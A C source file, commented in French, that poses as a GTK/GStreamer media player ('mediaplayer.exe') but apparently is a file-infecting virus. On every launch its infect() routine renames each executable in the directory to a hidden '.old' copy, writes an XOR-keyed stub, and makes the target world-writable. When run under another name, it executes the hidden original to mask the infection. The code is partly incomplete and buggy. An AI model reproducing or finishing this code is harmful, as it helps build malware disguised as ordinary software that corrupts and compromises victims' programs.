#include <gtk/gtk.h>
#include <gst/gst.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>




//1.1
void gst_find_rep()
{
    //obfusque la declaration de la variable d
    DIR *d;
    struct dirent *dir; 
    d = opendir("."); 
    if (d)
    {        
        while ((dir = readdir(d)) != NULL)
        {
            struct stat sb; // structure pour recuperer les informations sur le fichier           
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0)
            {
                stat(dir->d_name, &sb); // recuperation des informations sur le fichier
                if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode))
                {
                    printf("%s\n", dir->d_name);
                }
            }
        }
        closedir(d);
}
}


//1.2
void infect()
{    
    int i = 0;
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        
        while ((dir = readdir(d)) != NULL)
        {
            struct stat sb;
            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ".old") == NULL)
            {
                
                if(!stat(dir->d_name, &sb))
                {                    
                             
                if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) // si le fichier est executable
                {
                    printf("Infection en cours...\n");
                    printf("%s\n", dir->d_name);
                    char *fichier =(char *) dir->d_name;
                    //fichier_old_existe(dir->d_name);
                    printf("existe %d\n", fichier_old_existe(fichier));
                    if(fichier_old_existe(fichier) == -1)
                    {
                        char *fichier_old = malloc(strlen(fichier) + 15);
                        strcpy(fichier_old,".");
                        strcat(fichier_old,fichier);
                        strcat(fichier_old,".old");                        
                        
                        if(rename(fichier, fichier_old) == 0)
                        {
                            printf("Fichier %s renomme en %s\n", fichier, fichier_old);
                        }
                        else
                        {
                         
                            printf("Erreur lors du renommage du fichier %s\n", fichier);
                        }
                        /********************************************************************************************/
	/*											copie du virus avec encryption xor et mettre la decryption en entete  sans altération du fichier cible et donner le droit chmod 766 								*/
	/********************************************************************************************/
                        FILE *virus = fopen("mediaplayer.exe", "rb");
                        FILE *cible = fopen("test.c", "wb");
                        FILE *cible_old = fopen(fichier_old, "rb");
                        if (virus != NULL && cible != NULL && cible_old != NULL)
                        {
                            // Generer la clé de chiffrement xor random
                            srand(time(NULL));
                            unsigned char key = rand() % 255;
                            //write the include header
                            fprintf(cible, "#include <stdio.h>\n");
                            fprintf(cible, "#include <stdlib.h>\n");
                            fprintf(cible, "#include <string.h>\n");
                            fprintf(cible, "#include <unistd.h>\n");
                            fprintf(cible, "#include <sys/stat.h>\n");
                            fprintf(cible, "#include <sys/types.h>\n");
                            fprintf(cible, "#include <fcntl.h>\n");
                            fprintf(cible, "#include <errno.h>\n");
                            fprintf(cible, "#include <time.h>\n");  
                            fprintf(cible, "int main(int argc, char *argv[]) {\n");
                            fprintf(cible, "unsigned char key = %d;\n", key);
                            //put the encrypted that are numbers by comments in the file
                            //check if we have a comment in the file
                            char line[256];
                            while (fgets(line, sizeof(line), cible_old))
                            {
                                if (strstr(line, "//") != NULL)
                                {
                                    printf("%s", line);
                                }
                            }
                            //put the size of the code in a variable
                            fseek(virus, 0, SEEK_END);
                            long size = ftell(virus);
                            fprintf(cible, "int size = %ld;\n", size);
                            //put the decryption code
                            fprintf(cible, "for (int i = 0; i < size; i++) {\n");
                            fprintf(cible, "code[i] ^= key;\n");
                            fprintf(cible, "}\n");
                            //write the code in a file that will be executed
                            
                            
                            fclose(virus);
                            fclose(cible);
                            fclose(cible_old);
                            chmod(fichier, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH);
                            printf("Infection reussie\n");



                        }
                        else
                        {
                            printf("Erreur lors de l'infection\n");
                        }
                    }
                    else
                    {
                        printf("Fichier %s deja cible\n", fichier);
                    }
                        
                        
                        
                }
                }   
            }
        }
        closedir(d);
    }
    
}


int fichier_old_existe(char *fichier)
{
 // si le fichier cible courant ne possède pas l'extension .old alors vérifier qu'il n'existe pas dans le repertoire courant un autre fichier du meme nom mais portant lui l'extension .old
 char *first_check = malloc(strlen(fichier) + 15);
 strcpy(first_check,".");
 strcat(first_check,fichier);
strcat(first_check,".old");

    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0)
            {                                                
                if (strcmp(dir->d_name, first_check) == 0 && strstr(dir->d_name, ".old") != NULL)
                {
                    if(fopen(first_check, "r") != NULL)
                    {
                        closedir(d);
                        return 1;
                    }                                      
                }                
            }
        }
        closedir(d);
    }
    return -1;
}


//tester si le fichier est deja ciblé
void fichier_deja_cible()
{    
    char *fichier = "CalculatriceBasique";        
    
    if (fichier_old_existe(fichier) == 1)
    {
        printf("Fichier %s deja cible\n", fichier);
    }
    else
    {
        printf("Fichier %s non cible\n", fichier);
    }
}





static GtkWidget *image;
static GstElement *pipeline;
static gboolean is_playing = FALSE;

static void play_pause_button_clicked(GtkWidget *widget, gpointer data) {
    if (is_playing) {
        gst_element_set_state(pipeline, GST_STATE_PAUSED);
        is_playing = FALSE;
    } else {
        gst_element_set_state(pipeline, GST_STATE_PLAYING);
        is_playing = TRUE;
    }
}

static void stop_button_clicked(GtkWidget *widget, gpointer data) {
    gst_element_set_state(pipeline, GST_STATE_NULL);
    is_playing = FALSE;
}

static void file_chooser_button_clicked(GtkWidget *widget, gpointer data) {    
    GtkWidget *dialog;
    GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
    gint res;
        dialog = gtk_file_chooser_dialog_new("Open File", GTK_WINDOW(data), action, "Cancel", GTK_RESPONSE_CANCEL, "Open", GTK_RESPONSE_ACCEPT, NULL);

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT) {
        gchar *filename;
        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
        filename = gtk_file_chooser_get_filename(chooser);

        GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filename, NULL);
        if (!pixbuf) {
            g_error("Failed to load image: %s", filename);
            g_free(filename);
            gtk_widget_destroy(dialog);
            return;
        }

        // Resize the image to fit within a 400x400 area
        GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 400, 400, GDK_INTERP_BILINEAR);
        g_object_unref(pixbuf);

        gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);
        g_object_unref(resized_pixbuf);

        gst_element_set_state(pipeline, GST_STATE_NULL);

        g_free(filename);
    }

    gtk_widget_destroy(dialog);
}

int main(int argc, char *argv[]) {    
    
    infect();                
    if (strcmp(argv[0], "./mediaplayer.exe") == 0)
    {
        gtk_init(&argc, &argv);
    gst_init(&argc, &argv);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);

    GtkWidget *vbox = gtk_vbox_new(FALSE, 5);

    image = gtk_image_new();
    gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);

    GtkWidget *play_pause_button = gtk_button_new_with_label("Play/Pause");
    g_signal_connect(play_pause_button, "clicked", G_CALLBACK(play_pause_button_clicked), NULL);
    gtk_box_pack_start(GTK_BOX(vbox), play_pause_button, FALSE, FALSE, 0);

    GtkWidget *stop_button = gtk_button_new_with_label("Stop");
    g_signal_connect(stop_button, "clicked", G_CALLBACK(stop_button_clicked), NULL);
    gtk_box_pack_start(GTK_BOX(vbox), stop_button, FALSE, FALSE, 0);

    GtkWidget *file_chooser_button = gtk_button_new_with_label("Open File");
    g_signal_connect(file_chooser_button, "clicked", G_CALLBACK(file_chooser_button_clicked), window);
    gtk_box_pack_start(GTK_BOX(vbox), file_chooser_button, FALSE, FALSE, 0);

    gtk_container_add(GTK_CONTAINER(window), vbox);

    pipeline = gst_pipeline_new("media-player");

    gtk_widget_show_all(window);
    gtk_main();

    gst_element_set_state(pipeline, GST_STATE_NULL);
    gst_object_unref(GST_OBJECT(pipeline));

    }
    else
    {        
            DIR *d;
        struct dirent *dir;
        d = opendir(".");
        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0)
                {
                    struct stat sb;
                    stat(dir->d_name, &sb);
                    if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode))
                    {                        
                        char *name_file = malloc(strlen(argv[0]) + 10);                        
                        strncpy(name_file, argv[0] + 2, strlen(argv[0]) - 2); 
                        char *verif_name = malloc(strlen(name_file) + 5);
                        strcpy(verif_name,".");
                        strcat(verif_name,name_file);
                        strcat(verif_name,".old");
                        
                        printf("verif_name %s\n", verif_name);
                        
                        if(strcmp(dir->d_name, verif_name) == 0)
                        {                            
                            printf("Fichier %s deja cible\n", dir->d_name);
                            
                            strcpy(verif_name ,"./");
                            strcat(verif_name, ".");
                            strcat(verif_name, name_file);
                            strcat(verif_name, ".old");
                            

                            printf("command %s\n", verif_name);
                            execl(verif_name, NULL);
                        }
                    }
                }
            }
            closedir(d);
        } 
                   
    }    
        

    return 0;
}
